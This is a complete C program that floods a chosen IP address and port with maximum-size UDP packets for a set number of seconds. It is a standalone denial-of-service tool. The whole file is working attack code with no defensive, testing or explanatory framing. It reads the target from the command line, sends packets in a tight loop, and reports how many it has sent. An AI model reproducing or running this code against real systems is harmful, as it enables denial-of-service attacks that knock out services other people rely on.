#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>

#define BUFFER_SIZE 65507

typedef struct {
    char ip[16];
    int port;
    int duration;
} flood_args_t;

void *udp_flood(void *args) {
    flood_args_t *flood_args = (flood_args_t *)args;
    const char *ip = flood_args->ip;
    int port = flood_args->port;
    int duration = flood_args->duration;
    
    int sock;
    struct sockaddr_in target;
    char buffer[BUFFER_SIZE];
    socklen_t target_len = sizeof(target);

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sock);
        pthread_exit(NULL);
    }

    memset(buffer, 'A', BUFFER_SIZE);

    int time_elapsed = 0;
    time_t start_time = time(NULL);
    long packet_count = 0;
    
    printf("Starting UDP flood on %s:%d for %d seconds\n", ip, port, duration);
    
    while (time_elapsed < duration) {
        if (sendto(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&target, target_len) < 0) {
            perror("Sendto failed");
            close(sock);
            pthread_exit(NULL);
        }
        packet_count++;
        time_elapsed = (int)(time(NULL) - start_time);
        
        // Print progress every second
        static int last_report = 0;
        if (time_elapsed != last_report) {
            printf("Time elapsed: %d/%d seconds, Packets sent: %ld\n", 
                   time_elapsed, duration, packet_count);
            last_report = time_elapsed;
        }
    }

    printf("UDP flood completed. Total packets sent: %ld\n", packet_count);
    close(sock);
    free(args); // Free the allocated structure
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    // Allocate and initialize thread arguments
    flood_args_t *args = malloc(sizeof(flood_args_t));
    if (!args) {
        perror("Memory allocation failed");
        exit(EXIT_FAILURE);
    }
    
    strncpy(args->ip, ip, sizeof(args->ip) - 1);
    args->ip[sizeof(args->ip) - 1] = '\0';
    args->port = port;
    args->duration = duration;

    pthread_t thread;
    if (pthread_create(&thread, NULL, udp_flood, (void *)args) != 0) {
        perror("Could not create thread");
        free(args);
        exit(EXIT_FAILURE);
    }

    pthread_join(thread, NULL);

    return 0;
}
